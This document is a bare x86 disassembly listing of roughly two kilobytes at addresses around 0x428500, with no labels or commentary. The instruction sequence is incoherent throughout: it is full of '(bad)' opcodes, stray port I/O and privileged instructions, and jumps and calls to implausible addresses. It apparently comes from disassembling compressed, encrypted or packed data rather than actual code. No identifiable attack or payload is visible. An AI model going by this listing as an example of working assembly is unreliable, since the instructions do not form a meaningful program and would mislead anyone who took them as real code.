  4284e0:	ins    DWORD PTR es:[edi],dx
  4284e1:	pop    ss
  4284e2:	cmp    ch,al
  4284e4:	sub    al,0xa5
  4284e6:	push   ebp
  4284e7:	cmp    BYTE PTR [edi+0x71],bh
  4284ea:	mov    fs,WORD PTR [eax]
  4284ec:	ficom  DWORD PTR [esi]
  4284ee:	mov    dh,0x76
  4284f0:	mov    eax,ds:0xf91aaca1
  4284f5:	mov    dh,0xaa
  4284f7:	adc    al,BYTE PTR [ebx-0x4968938b]
  4284fd:	add    eax,0xefec4878
  428502:	inc    esp
  428503:	adc    ebp,edx
  428505:	mov    esp,ds
  428507:	inc    edx
  428508:	popa   
  428509:	fild   DWORD PTR [ecx]
  42850b:	es retf 
  42850d:	push   ss
  42850e:	or     BYTE PTR [edx+0x5b5b0d73],bh
  428514:	rol    dl,1
  428516:	(bad)  
  428517:	jbe    0x428586
  428519:	into   
  42851a:	xchg   ecx,eax
  42851b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42851c:	(bad)
  42851f:	aam    0x41
  428521:	jns    0x428534
  428523:	add    ch,cl
  428525:	pop    ss
  428526:	inc    ebp
  428527:	add    bl,BYTE PTR [ebp+0x69]
  42852a:	mov    ebx,0xd105b5b5
  42852f:	adc    DWORD PTR [esi-0x1e],ebx
  428532:	shl    al,1
  428534:	repnz dec edx
  428536:	add    eax,0xf45db5b6
  42853b:	jmp    0x31638dea
  428540:	dec    edx
  428541:	mov    bl,0x86
  428543:	(bad)  
  428544:	fist   DWORD PTR [esp+edi*8-0x16]
  428548:	test   DWORD PTR [ebx],edx
  42854a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42854b:	lea    eax,[eax-0x3da2eaa8]
  428551:	push   ss
  428552:	mov    al,ds:0xb01d4012
  428557:	lods   eax,DWORD PTR ds:[esi]
  428558:	sbb    eax,0x2cda2ed4
  42855d:	pop    ss
  42855e:	enter  0x63b,0x4a
  428562:	xchg   esp,eax
  428563:	mov    eax,ds:0xaa6db6e0
  428568:	inc    ebp
  428569:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42856a:	mov    al,ds:0xd6b298e6
  42856f:	or     ebx,DWORD PTR [ebx+0x53]
  428572:	mov    ch,0xaa
  428574:	and    BYTE PTR [ebp+0x7036b3cf],bh
  42857a:	fimul  DWORD PTR ds:0x2b817cb7
  428580:	mov    ebp,0x79440000
  428585:	lods   eax,DWORD PTR ds:[esi]
  428586:	adc    al,0x6f
  428588:	push   es
  428589:	fcmovnbe st,st(6)
  42858b:	xchg   esi,eax
  42858c:	enter  0xecc6,0x53
  428590:	(bad)  
  428591:	(bad)  
  428592:	lock stos BYTE PTR es:[edi],al
  428594:	jbe    0x42860f
  428596:	loope  0x42855a
  428598:	push   ebp
  428599:	mov    esp,DWORD PTR [edi-0x25]
  42859c:	out    dx,al
  42859d:	mov    esp,0xc2a86800
  4285a2:	jmp    0xadd090a7
  4285a7:	mov    ch,ah
  4285a9:	adc    dl,BYTE PTR [ebp+0xa]
  4285ac:	jno    0x428609
  4285ae:	push   0xda8ce50b
  4285b3:	cmp    eax,0x62ae7176
  4285b8:	pop    ebx
  4285b9:	or     ebx,DWORD PTR [ebx+0x57]
  4285bc:	repz retf 0x7032
  4285c0:	test   DWORD PTR ds:0x4b0dcc4,0xa1ef6db0
  4285ca:	inc    esp
  4285cb:	ds in  al,dx
  4285cd:	and    BYTE PTR [esi-0x22b2a44b],dh
  4285d3:	sub    dh,0x66
  4285d6:	dec    ebx
  4285d7:	mov    edi,0x51c5a3b9
  4285dc:	mov    al,0x6d
  4285de:	(bad)  
  4285e0:	push   cs
  4285e1:	fmul   st,st(6)
  4285e3:	and    bl,BYTE PTR [ecx+0x4]
  4285e6:	xor    DWORD PTR [esi+0x61],0xffffffa9
  4285ea:	dec    bp
  4285ec:	pop    edi
  4285ed:	retf   0xdfee
  4285f0:	pop    edi
  4285f1:	push   cs
  4285f2:	add    dh,BYTE PTR [ebp+0x3cbb6360]
  4285f8:	fbld   TBYTE PTR [edx]
  4285fa:	inc    ecx
  4285fb:	sub    al,0x74
  4285fd:	rol    BYTE PTR [ebp-0x68e659c3],1
  428603:	mov    cl,0x4c
  428605:	pop    ss
  428606:	xchg   esi,eax
  428607:	mov    ch,BYTE PTR [ebp-0x4d8ebe00]
  42860d:	mul    ecx
  42860f:	mov    dh,0x16
  428611:	sbb    cl,BYTE PTR [eax]
  428613:	inc    esp
  428614:	mov    dh,0x31
  428616:	jmp    0xdd45:0xda3e1628
  42861d:	lds    esi,FWORD PTR [ecx-0x76]
  428620:	pusha  
  428621:	and    bl,BYTE PTR [ebx]
  428623:	mov    ch,0x1a
  428625:	inc    ebp
  428626:	lea    ebp,[ebp-0x55]
  428629:	shl    BYTE PTR fs:[edi+eiz*4-0x492568d9],cl
  428631:	mov    cl,0xce
  428633:	sub    ah,BYTE PTR [ebx-0x8]
  428636:	je     0x428673
  428638:	sub    bh,0xd6
  42863b:	test   DWORD PTR es:[ebp+0x2b],ebp
  42863f:	or     ebx,esp
  428641:	pop    ebp
  428642:	cmp    ecx,DWORD PTR [edi]
  428644:	push   esi
  428645:	jns    0x428654
  428647:	mov    al,0xd4
  428649:	or     BYTE PTR [esi+0x6a699221],dh
  42864f:	(bad)  
  428651:	mov    cl,0x6d
  428653:	ins    DWORD PTR es:[edi],dx
  428654:	mov    ebx,0xd7ec8622
  428659:	popa   
  42865a:	push   cs
  42865b:	jecxz  0x42862e
  42865d:	gs pop edi
  42865f:	test   DWORD PTR ds:0x3a4d12da,ebp
  428665:	das    
  428666:	stc    
  428667:	ret    
  428668:	scas   eax,DWORD PTR es:[edi]
  428669:	ret    0xa585
  42866c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42866d:	nop
  42866e:	sahf   
  42866f:	fmulp  st(6),st
  428671:	std    
  428672:	out    dx,al
  428673:	mov    al,ds:0x6cb47372
  428678:	jne    0x42863e
  42867a:	jle    0x4286d5
  42867c:	sub    edi,eax
  42867e:	push   ecx
  42867f:	xlat   BYTE PTR ds:[ebx]
  428680:	(bad)  
  428681:	in     eax,dx
  428682:	mov    dh,0xb5
  428684:	cwde   
  428685:	adc    ebp,DWORD PTR [edx+0x48]
  428688:	outs   dx,BYTE PTR ds:[esi]
  428689:	imul   edx,DWORD PTR [ebx-0x44d5842c],0x866d6db5
  428693:	or     eax,0x899e061f
  428698:	mov    dl,0x23
  42869a:	popf   
  42869b:	mov    esp,0x5b6ed045
  4286a0:	cwde   
  4286a1:	repz aam 0x48
  4286a4:	fimul  DWORD PTR [eax]
  4286a6:	or     ecx,DWORD PTR [ebx]
  4286a8:	pop    ebp
  4286a9:	mov    ah,0xf2
  4286ab:	sbb    eax,0x8c78817
  4286b0:	mov    eax,fs:0x5b1b6d6d
  4286b6:	cli    
  4286b7:	or     al,0x33
  4286b9:	jnp    0x428650
  4286bb:	pop    esi
  4286bc:	push   ss
  4286bd:	mov    ecx,0x45685b61
  4286c2:	inc    edx
  4286c3:	inc    ebx
  4286c4:	adc    DWORD PTR [eax-0x21],0xa5a5db0a
  4286cb:	ins    DWORD PTR es:[edi],dx
  4286cc:	add    eax,0x3057a32
  4286d1:	push   cs
  4286d2:	inc    ebx
  4286d3:	pop    esp
  4286d4:	sbb    dh,bl
  4286d6:	push   ecx
  4286d7:	pop    ebx
  4286d8:	rcl    DWORD PTR [edi],0xcc
  4286db:	ss cwde 
  4286dd:	sti    
  4286de:	mov    edx,0x10076208
  4286e3:	mov    esi,0xdfef5e19
  4286e8:	outs   dx,BYTE PTR ds:[esi]
  4286e9:	retf   
  4286ea:	xchg   edi,eax
  4286eb:	pop    ecx
  4286ec:	call   0xf1b58780
  4286f1:	cwde   
  4286f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4286f3:	pusha  
  4286f4:	mov    eax,ebp
  4286f6:	add    bh,ah
  4286f8:	push   ebx
  4286f9:	(bad)  
  4286fa:	push   ss
  4286fb:	pop    edx
  4286fc:	sub    ebx,DWORD PTR [ecx+0x3d]
  4286ff:	mov    ebx,0x855f3ea3
  428704:	push   ss
  428705:	(bad)
  428708:	cmp    eax,0x6e6d9195
  42870d:	sbb    esi,DWORD PTR [ecx+eax*8]
  428710:	dec    esp
  428711:	add    DWORD PTR [ebx-0x495340ca],eax
  428717:	rcr    DWORD PTR [edi-0x7],cl
  42871a:	ret    0x95b6
  42871d:	mov    WORD PTR [esi+0x1371c2cb],es
  428723:	bound  edx,QWORD PTR [edi+0x5ad19200]
  428729:	push   ebx
  42872a:	jne    0x42873d
  42872c:	mov    ds:0x6fda9bea,al
  428731:	jb     0x428704
  428733:	jbe    0x4286d6
  428735:	cmp    DWORD PTR [edx],ecx
  428737:	inc    edi
  428738:	and    ch,BYTE PTR [ebp-0x7249b53f]
  42873e:	ins    DWORD PTR es:[edi],dx
  42873f:	and    DWORD PTR [ecx+eax*4],0xe0998a26
  428746:	into   
  428747:	push   ecx
  428748:	push   0xac16b617
  42874d:	lods   eax,DWORD PTR ds:[esi]
  42874e:	xor    DWORD PTR [ecx+0x4],ecx
  428751:	push   ebx
  428752:	hlt    
  428753:	cmc    
  428754:	push   0x61
  428756:	popa   
  428757:	pop    ebx
  428758:	xchg   edi,eax
  428759:	cs jecxz 0x428723
  42875c:	mov    ds:0xc6013d5a,eax
  428761:	adc    al,ah
  428763:	out    0x59,al
  428765:	and    BYTE PTR ds:0xd8f081eb,al
  42876b:	outs   dx,BYTE PTR ds:[esi]
  42876c:	pop    ebp
  42876d:	les    ebx,FWORD PTR [ebx-0x666a3e21]
  428773:	sub    esi,DWORD PTR [edx]
  428775:	ss sbb al,cl
  428778:	(bad)  
  428779:	push   esi
  42877a:	and    eax,0x520c0d29
  42877f:	fsubr  QWORD PTR [ebx-0x7577249e]
  428785:	or     ah,BYTE PTR [ebx]
  428787:	or     al,0x9f
  428789:	fcmovnbe st,st(6)
  42878b:	push   ecx
  42878c:	mov    al,0x47
  42878e:	adc    BYTE PTR [ecx-0x52],0xa2
  428792:	ficom  DWORD PTR [edi]
  428794:	xor    DWORD PTR [esi+0x686edb6d],esi
  42879a:	sub    edx,ebp
  42879c:	sbb    eax,0x5647650f
  4287a1:	push   edx
  4287a2:	and    bh,al
  4287a4:	push   es
  4287a5:	shl    BYTE PTR [esi-0x78d58e2f],1
  4287ab:	dec    edx
  4287ac:	into   
  4287ad:	or     eax,0x85a015b1
  4287b2:	sub    esp,DWORD PTR [ecx]
  4287b4:	mov    edi,0xab76b0fb
  4287b9:	cmp    DWORD PTR [eax-0x1291035e],0xfffffff0
  4287c0:	mov    BYTE PTR ds:0x36059876,dl
  4287c6:	push   ss
  4287c7:	mov    dh,0xa4
  4287c9:	mov    esi,0x48a58b01
  4287ce:	arpl   WORD PTR [esi-0x375fd2b5],si
  4287d4:	cmc    
  4287d5:	sahf   
  4287d6:	cmp    cl,BYTE PTR [edi+edx*1-0x6924a9b8]
  4287dd:	or     eax,0xbc7bd42f
  4287e2:	pusha  
  4287e3:	aam    0x13
  4287e5:	ins    DWORD PTR es:[edi],dx
  4287e6:	jns    0x42884b
  4287e8:	jmp    0x35d75b9
  4287ed:	cmp    DWORD PTR [edx+0x0],0x4defb429
  4287f4:	push   esp
  4287f5:	mov    bh,0xb6
  4287f7:	je     0x42883a
  4287f9:	inc    ecx
  4287fa:	add    esi,esi
  4287fc:	icebp  
  4287fd:	leave  
  4287fe:	fst    st(2)
  428800:	ret    0x6db6
  428803:	(bad)  
  428804:	mov    al,ds:0x7b207ce9
  428809:	pop    ds
  42880a:	sub    eax,0x4b040df2
  42880f:	aam    0x9f
  428811:	pop    esi
  428812:	test   eax,0x45d09029
  428817:	sub    eax,0x365a2b44
  42881c:	xchg   DWORD PTR [eax],ecx
  42881e:	mov    dh,0xe5
  428820:	mov    edi,0x5c140a
  428825:	dec    BYTE PTR [ecx-0x27a06800]
  42882b:	push   ebx
  42882c:	and    DWORD PTR [ebp-0x1d],ebp
  42882f:	inc    esi
  428830:	cmp    edi,esi
  428832:	mov    ah,0xc4
  428834:	jecxz  0x4288a5
  428836:	loopne 0x42882d
  428838:	in     eax,dx
  428839:	adc    bl,BYTE PTR [ebx]
  42883b:	or     ecx,DWORD PTR [ecx+esi*4-0x58]
  42883f:	sahf   
  428840:	fs inc eax
  428842:	in     eax,0x2c
  428844:	push   ebp
  428845:	fisubr DWORD PTR [esi-0x5b]
  428848:	or     eax,DWORD PTR [edi+0x7d]
  42884b:	pusha  
  42884c:	out    0xc5,eax
  42884e:	adc    al,0xdd
  428850:	pop    ebx
  428851:	mov    eax,0xac82b1b1
  428856:	js     0x428893
  428858:	test   al,0x70
  42885a:	fstp   st(4)
  42885c:	inc    ecx
  42885d:	in     al,dx
  42885e:	outs   dx,BYTE PTR ds:[esi]
  42885f:	ins    DWORD PTR es:[edi],dx
  428860:	test   DWORD PTR [ebx+0x2f],ebx
  428863:	(bad)  
  428865:	std    
  428866:	retf   
  428867:	or     al,0x82
  428869:	jmp    0x2c6ff657
  42886e:	adc    eax,0x970b33af
  428873:	cmovg  eax,DWORD PTR [edx-0x4f4ff56a]
  42887a:	sbb    dh,BYTE PTR [ebx]
  42887c:	pop    esi
  42887d:	pop    ds
  42887e:	popa   
  42887f:	retf   
  428880:	shl    DWORD PTR [eax-0x5a5c924b],1
  428886:	inc    ebp
  428887:	xlat   BYTE PTR ds:[ebx]
  428888:	or     dh,BYTE PTR [edx]
  42888a:	sti    
  42888b:	xor    eax,0xb414adc1
  428890:	cmp    al,BYTE PTR [ebp-0x14]
  428893:	fcmovb st,st(7)
  428895:	call   0xf9196bfd
  42889a:	cwde   
  42889b:	fsqrt  
  42889d:	mov    ebp,0x6066a450
  4288a2:	xor    esi,DWORD PTR [edi+esi*1-0x76aae94a]
  4288a9:	sub    al,0xa4
  4288ab:	xor    edi,DWORD PTR [edi]
  4288ad:	inc    ecx
  4288ae:	fild   DWORD PTR [edx+0x51990170]
  4288b4:	arpl   WORD PTR [ebp-0x3a],di
  4288b7:	jbe    0x42885a
  4288b9:	jne    0x4288e3
  4288bb:	xchg   ebp,eax
  4288bc:	adc    bl,0x2
  4288bf:	imul   edi,eax,0x35
  4288c2:	leave  
  4288c3:	xor    BYTE PTR [esi-0x8735a7b],0x8b
  4288ca:	and    al,BYTE PTR [ebx+0x1b0b4bb1]
  4288d0:	xor    al,0xdc
  4288d2:	enter  0xcd6a,0xe2
  4288d6:	jmp    0x6a62e2f7
  4288db:	mov    BYTE PTR [ecx+0x47ed8a8],cl
  4288e1:	pop    eax
  4288e2:	fcomp  DWORD PTR [edx-0x7951e958]
  4288e8:	sbb    ebp,DWORD PTR [ecx+0x5b636d86]
  4288ee:	pop    edx
  4288ef:	inc    ebx
  4288f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4288f1:	adc    edx,edi
  4288f3:	shl    DWORD PTR [esi],1
  4288f5:	cmp    ebp,ecx
  4288f7:	repnz fild DWORD PTR [edx+0x13]
  4288fb:	aad    0x67
  4288fd:	mul    DWORD PTR [ebp-0x2559e987]
  428903:	dec    ebp
  428904:	pop    edx
  428905:	outs   dx,BYTE PTR ds:[esi]
  428906:	sub    al,0xb4
  428908:	xor    eax,edi
  42890a:	sbb    DWORD PTR [ecx+0x52bdc00c],edx
  428910:	ins    DWORD PTR es:[edi],dx
  428911:	fistp  DWORD PTR [edx]
  428913:	mov    al,BYTE PTR [ecx+0x63]
  428916:	sahf   
  428917:	mov    DWORD PTR [esi+0x5d6eb3be],esi
  42891d:	aad    0xa5
  42891f:	fs mov dh,0xe0
  428922:	xor    al,0xb9
  428924:	test   al,0x6e
  428926:	jo     0x4288f1
  428928:	fisubr DWORD PTR [esi]
  42892a:	sub    al,0x15
  42892c:	cmp    eax,0x57b85968
  428931:	dec    esp
  428932:	retf   
  428933:	xchg   esi,eax
  428934:	fcmovu st,st(2)
  428936:	lea    eax,[esi]
  428938:	ret    0x7832
  42893b:	fistp  DWORD PTR [ebx+0x1399863b]
  428941:	jne    0x42899e
  428943:	pop    eax
  428944:	add    eax,0xce53d956
  428949:	in     al,0xa9
  42894b:	rcr    ebp,0x60
  42894e:	sub    eax,DWORD PTR [ecx-0x6a]
  428951:	adc    ebx,ecx
  428953:	push   0x65
  428955:	jge    0x4289a1
  428957:	sub    al,0xb4
  428959:	mov    ds:0x7eb03bb1,al
  42895e:	sub    dh,BYTE PTR [eax-0x4]
  428961:	mov    eax,ds:0xb76ed541
  428966:	or     DWORD PTR [ebx+0x3e],esi
  428969:	cs rcr bl,1
  42896c:	(bad)  
  42896d:	add    BYTE PTR [ecx+0x61],dh
  428970:	sbb    dh,BYTE PTR [esi]
  428972:	and    DWORD PTR [edi-0x4fae4c29],esp
  428978:	mov    ebp,DWORD PTR [esi+0x1b]
  42897b:	not    BYTE PTR [eax-0x40aca8f8]
  428981:	leave  
  428982:	mov    bl,0x2
  428984:	ins    DWORD PTR es:[edi],dx
  428985:	fild   DWORD PTR [ebx+edi*8]
  428988:	mov    esi,0x1a4847b7
  42898d:	push   es
  42898e:	outs   dx,BYTE PTR ds:[esi]
  42898f:	sub    eax,0x47afd0c8
  428994:	and    BYTE PTR [edi+edx*8-0x72],bl
  428998:	sbb    eax,0x880a1b10
  42899d:	(bad)  
  42899e:	jae    0x4289c9
  4289a0:	or     ecx,DWORD PTR [ebp-0x73b4757a]
  4289a6:	mov    bh,BYTE PTR [edi+0x5f57d21b]
  4289ac:	fnsave [esi+0x25be5ac2]
  4289b2:	repnz sbb ebp,DWORD PTR [edx+ebx*1]
  4289b6:	call   0x6e15:0xb6e275ce
  4289bd:	out    0x8f,al
  4289bf:	call   DWORD PTR [edi+0xc0b0811]
  4289c5:	xchg   al,bl
  4289c7:	adc    ah,bl
  4289c9:	cmp    bh,BYTE PTR [edi-0x709d4f82]
  4289cf:	jno    0x428a18
  4289d1:	lods   eax,DWORD PTR gs:[esi]
  4289d3:	lods   eax,DWORD PTR ds:[esi]
  4289d4:	lods   eax,DWORD PTR ds:[esi]
  4289d5:	add    DWORD PTR [edx],ebp
  4289d7:	popf   
  4289d8:	cmp    BYTE PTR [ecx+ecx*2-0x4eefc20d],ah
  4289df:	ins    DWORD PTR es:[edi],dx
  4289e0:	mov    bh,0x3f
  4289e2:	imul   edi,DWORD PTR [edi+0x3d],0xe
  4289e6:	inc    ecx
  4289e7:	and    dl,ch
  4289e9:	mov    dl,0xb6
  4289ec:	shl    BYTE PTR [edi-0x35],1
  4289ef:	jae    0x428a6b
  4289f1:	das    
  4289f2:	(bad)  
  4289f4:	pop    ss
  4289f5:	mov    ah,0x76
  4289f7:	add    al,0x1b
  4289f9:	jmp    0xb805:0x8f61985f
  428a00:	pop    edi
  428a01:	aaa    
  428a02:	mov    eax,0x11d1b1b1
  428a07:	imul   ebx,DWORD PTR [eax],0x4da815f9
  428a0d:	adc    bl,al
  428a0f:	mov    dh,0x46
  428a11:	aam    0xde
  428a13:	push   es
  428a14:	pop    ss
  428a15:	cmp    DWORD PTR [esi+0x5ad8a829],eax
  428a1b:	fdivr  DWORD PTR [edx-0x68c2028e]
  428a21:	lgs    ecx,FWORD PTR [edx+0x3baad452]
  428a28:	inc    esi
  428a2a:	ret    0xb0b6
  428a2d:	and    BYTE PTR [eax],dh
  428a2f:	and    eax,0x8891a484
  428a34:	sahf   
  428a35:	jne    0x428a1a
  428a37:	rol    dl,cl
  428a39:	ret    0x76db
  428a3c:	pop    eax
  428a3d:	lods   al,BYTE PTR ds:[esi]
  428a3e:	and    dh,BYTE PTR ds:0x3ba7d01
  428a44:	rol    BYTE PTR [esi-0x21bba696],0x3c
  428a4b:	mov    ds:0x45028896,eax
  428a50:	cld    
  428a51:	xor    DWORD PTR [esp+eax*4+0x2e],ebx
  428a55:	mov    ah,0xed
  428a57:	(bad)  
  428a58:	push   eax
  428a59:	sbb    ah,BYTE PTR [ecx+0x353b1d45]
  428a5f:	aaa    
  428a60:	popa   
  428a61:	fidiv  DWORD PTR ss:[esi]
  428a64:	mov    dh,0x8f
  428a66:	out    dx,al
  428a67:	inc    edx
  428a68:	ret    0x6a5
  428a6b:	push   edi
  428a6c:	imul   edi,DWORD PTR [edi],0x44
  428a6f:	fnstcw WORD PTR [esi+0x5c]
  428a72:	add    al,BYTE PTR [esi+0x2ccab86]
  428a78:	fwait
  428a79:	lods   eax,DWORD PTR ds:[esi]
  428a7a:	inc    eax
  428a7b:	sub    al,0x5c
  428a7d:	push   0xffffffbc
  428a7f:	out    dx,eax
  428a80:	push   esi
  428a81:	test   al,0x4f
  428a83:	repz fisttp DWORD PTR [esi+0x3449d6e8]
  428a8a:	jno    0x428a95
  428a8c:	mov    eax,ds:0xa7aea12d
  428a91:	in     eax,0xe1
  428a93:	push   esi
  428a94:	mov    BYTE PTR [eax-0x17],ch
  428a97:	and    DWORD PTR [esi+eiz*8-0x5f4b0289],0xffffff81
  428a9f:	push   0xe2a55113
  428aa4:	ins    DWORD PTR es:[edi],dx
  428aa5:	fld    TBYTE PTR [esi]
  428aa7:	sub    al,0xe5
  428aa9:	push   ebx
  428aaa:	cmp    ch,BYTE PTR ds:0x1d4ba483
  428ab0:	and    eax,0x6e289b56
  428ab5:	lea    ebp,[edi]
  428ab7:	scas   al,BYTE PTR es:[edi]
  428ab8:	sbb    dl,BYTE PTR [esi+ecx*8-0x3e]
  428abc:	jecxz  0x428b1b
  428abe:	(bad)  
  428abf:	inc    ecx
  428ac0:	je     0x428b2d
  428ac2:	mov    dh,0x1a
  428ac4:	dec    edi
  428ac5:	out    0x47,eax
  428ac7:	and    DWORD PTR [ecx+0x41],eax
  428aca:	scas   al,BYTE PTR es:[edi]
  428acb:	mov    ds:0xb1ec4ed,al
  428ad0:	xor    esp,DWORD PTR [esi+edi*4+0x331b854b]
  428ad7:	outs   dx,BYTE PTR ds:[esi]
  428ad8:	imul   ecx,ebp,0xef933556
  428ade:	sahf   
  428adf:	add    DWORD PTR [edx+0x2ea100d0],edi
  428ae5:	mov    esi,0xd44dad90
  428aea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428aeb:	mov    dh,0x79
  428aed:	hlt    
  428aee:	fwait
  428aef:	inc    edi
  428af0:	mov    eax,0x462c4ccd
  428af5:	mov    ecx,0xe95b6d4
  428afa:	jb     0x428b07
  428afc:	lods   eax,DWORD PTR ds:[esi]
  428afd:	dec    ebx
  428afe:	loop   0x428b66
  428b00:	mov    al,0xb5
  428b02:	in     eax,dx
  428b03:	(bad)  
  428b04:	aam    0x0
  428b06:	push   cs
  428b07:	mov    cs,ebx
  428b09:	or     eax,0xb69029b3
  428b0e:	push   ss
  428b0f:	sbb    dh,BYTE PTR [ecx-0x23fd08ae]
  428b15:	xchg   edx,eax
  428b16:	mov    ss,WORD PTR [esi-0x22575a94]
  428b1c:	sahf   
  428b1d:	sub    DWORD PTR [edi+0x1d],edi
  428b20:	mov    edi,ebp
  428b22:	fwait
  428b23:	pop    eax
  428b24:	push   0x77d506b7
  428b29:	inc    eax
  428b2a:	popf   
  428b2b:	mov    edi,0x75bbeaf4
  428b30:	inc    esp
  428b31:	pop    ebp
  428b32:	loop   0x428b44
  428b34:	ret    
  428b35:	xchg   ebp,eax
  428b36:	or     dl,bh
  428b38:	push   ebp
  428b39:	arpl   WORD PTR [esi+esi*4+0x676b6d11],cx
  428b40:	mov    eax,0xd023c5ca
  428b45:	xlat   BYTE PTR ds:[ebx]
  428b46:	push   0x13
  428b48:	rol    dl,1
  428b4a:	sbb    BYTE PTR [esp+edi*8+0x37240f8a],dl
  428b51:	xchg   esi,eax
  428b52:	mov    dh,0xe
  428b54:	or     ah,dh
  428b56:	push   ebx
  428b57:	scas   al,BYTE PTR es:[edi]
  428b58:	fwait
  428b59:	test   eax,0x4c23c636
  428b5e:	shr    BYTE PTR [ebp+0x6b],0x3e
  428b62:	repnz add ebx,ecx
  428b65:	or     BYTE PTR [ebx],cl
  428b67:	ins    DWORD PTR es:[edi],dx
  428b68:	mov    ds:0x320e8dda,eax
  428b6d:	int    0x93
  428b6f:	dec    esi
  428b70:	cli    
  428b71:	pop    ecx
  428b72:	jne    0x428b7c
  428b74:	fidiv  DWORD PTR [esi-0x73526b93]
  428b7a:	je     0x428bc4
  428b7c:	sbb    BYTE PTR [ebp+ebp*2+0x15],0xa2
  428b81:	cs jmp 0x41f4ba63
  428b87:	pop    ebp
  428b88:	add    BYTE PTR [edi],bl
  428b8a:	mov    edx,0xec2e6a80
  428b8f:	out    0xda,al
  428b91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428b92:	les    edx,FWORD PTR [esi]
  428b94:	or     dh,BYTE PTR [ecx+0x323fb96d]
  428b9a:	mov    WORD PTR [edi],?
  428b9c:	cmp    ah,BYTE PTR ds:0xd8dcadda
  428ba2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428ba3:	add    ecx,DWORD PTR [esi-0x68]
  428ba6:	cld    
  428ba7:	mov    eax,ds:0x68e054a6
  428bac:	aaa    
  428bad:	xchg   esi,eax
  428bae:	push   ss
  428baf:	jl     0x428b56
  428bb1:	mov    bl,0x36
  428bb3:	cld    
  428bb4:	test   DWORD PTR [ecx+0x38],eax
  428bb7:	sbb    eax,0x6fd85d45
  428bbc:	popa   
  428bbd:	push   ebp
  428bbe:	iret   
  428bbf:	push   es
  428bc0:	out    dx,eax
  428bc1:	fwait
  428bc2:	sbb    dl,BYTE PTR ss:[eax]
  428bc5:	or     ebx,esp
  428bc7:	mov    BYTE PTR [edi-0xa],al
  428bca:	ret    0x585d
  428bcd:	fdiv   DWORD PTR [esi]
  428bcf:	(bad)  [edi-0x6b]
  428bd2:	lds    ecx,FWORD PTR [ebx+ebp*8-0x45]
  428bd6:	stos   BYTE PTR es:[edi],al
  428bd7:	shr    BYTE PTR [ebp+0x5],0x8a
  428bdb:	lods   eax,DWORD PTR ds:[esi]
  428bdc:	sbb    bh,al
  428bde:	push   DWORD PTR [edx+0x51a3c392]
  428be4:	mov    al,0xb1
  428be6:	inc    edi
  428be7:	pop    ss
  428be8:	lock mov ecx,0x6dc1c0f6
  428bee:	popa   
  428bef:	imul   edx,edx,0x1c16fca7
  428bf5:	mov    WORD PTR [eax+0x6144b4d1],?
  428bfb:	inc    ebx
  428bfc:	mov    al,ds:0xa91fc24a
  428c01:	stc    
  428c02:	(bad)  
  428c03:	outs   dx,BYTE PTR ds:[esi]
  428c04:	retf   
  428c05:	mov    edi,0xae3611
  428c0a:	xor    eax,0x45950039
  428c0f:	in     al,dx
  428c10:	mov    ah,0x7b
  428c12:	inc    esp
  428c13:	(bad)
  428c17:	ret    0x8b30
  428c1a:	or     al,0x6a
  428c1c:	pop    ds
  428c1d:	mov    dl,0x85
  428c1f:	ret    0xddad
  428c22:	xchg   edx,eax
  428c23:	ret    0xa413
  428c26:	jge    0x428bd7
  428c28:	sub    esi,DWORD PTR [ebx-0x2a]
  428c2b:	stos   BYTE PTR es:[edi],al
  428c2c:	jle    0x428be5
  428c2e:	ret    0x2909
  428c31:	inc    ebx
  428c32:	xchg   ebp,eax
  428c33:	and    BYTE PTR [edx],dh
  428c35:	in     al,dx
  428c36:	bound  edx,QWORD PTR [ecx]
  428c38:	and    eax,0x72675b13
  428c3d:	jge    0x428c5c
  428c3f:	and    edx,DWORD PTR [ecx-0x7b]
  428c42:	das    
  428c43:	fisubr DWORD PTR [ebp+0x2adec2c2]
  428c49:	xchg   esp,eax
  428c4a:	mov    cl,0xb8
  428c4c:	adc    ecx,esi
  428c4e:	in     eax,dx
  428c4f:	push   cs
  428c50:	rol    DWORD PTR ds:0xb1bb1616,0x73
  428c57:	cmp    BYTE PTR [ebx-0x350397],dl
  428c5d:	or     ecx,DWORD PTR ds:0x2e225726
  428c63:	fld    DWORD PTR [eax]
  428c65:	sahf   
  428c66:	mov    dl,0x0
  428c68:	in     al,0xa7
  428c6a:	add    BYTE PTR [ebx],ah
  428c6c:	retf   0x1435
  428c6f:	fcom   QWORD PTR [esi]
  428c71:	sub    ah,dl
  428c73:	dec    edx
  428c74:	mov    edx,0xc0a0cabc
  428c79:	mov    dh,0x0
  428c7b:	mov    ch,0x8c
  428c7d:	xor    DWORD PTR [eax+0x1e],esi
  428c80:	mov    eax,ds:0x7114db51
  428c85:	mov    ds:0xff559cb1,eax
  428c8a:	fimul  WORD PTR [edi-0x5c]
  428c8d:	jl     0x428cda
  428c8f:	ins    DWORD PTR es:[edi],dx
  428c90:	jmp    0xe5310bd7
  428c95:	or     BYTE PTR [edi],dh
  428c97:	push   cs
  428c98:	fisub  DWORD PTR [ecx-0x5564bacb]
  428c9e:	mov    bl,0xf3
  428ca0:	cs xchg esi,esp
  428ca3:	jb     0x428cf0
  428ca5:	pop    ebx
  428ca6:	pop    ebx
  428ca7:	mov    eax,0xd3745ca1
  428cac:	loopne 0x428d22
  428cae:	(bad)  
  428caf:	jg     0x428ce0
  428cb1:	leave  
  428cb2:	mov    edx,0x6e6c2c6d
  428cb7:	push   cs
  428cb8:	jl     0x428d0d
  428cba:	adc    eax,0xc744a17c
  428cbf:	fld    TBYTE PTR [ebp+0x57afd829]
  428cc5:	or     DWORD PTR [ebp+eax*1+0x2c],edi
  428cc9:	xchg   edi,eax
  428cca:	mov    ecx,0xadd50359
  428ccf:	ins    DWORD PTR es:[edi],dx
  428cd0:	xor    bh,BYTE PTR [edi+0x41]
  428cd3:	fwait
  428cd4:	or     edx,esi
  428cd6:	je     0x428c60
  428cd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428cd9:	in     eax,dx
  428cda:	inc    edx
  428cdb:	add    eax,0x35645b40
  428ce0:	and    BYTE PTR [esi+edi*4],dl
  428ce3:	push   ecx
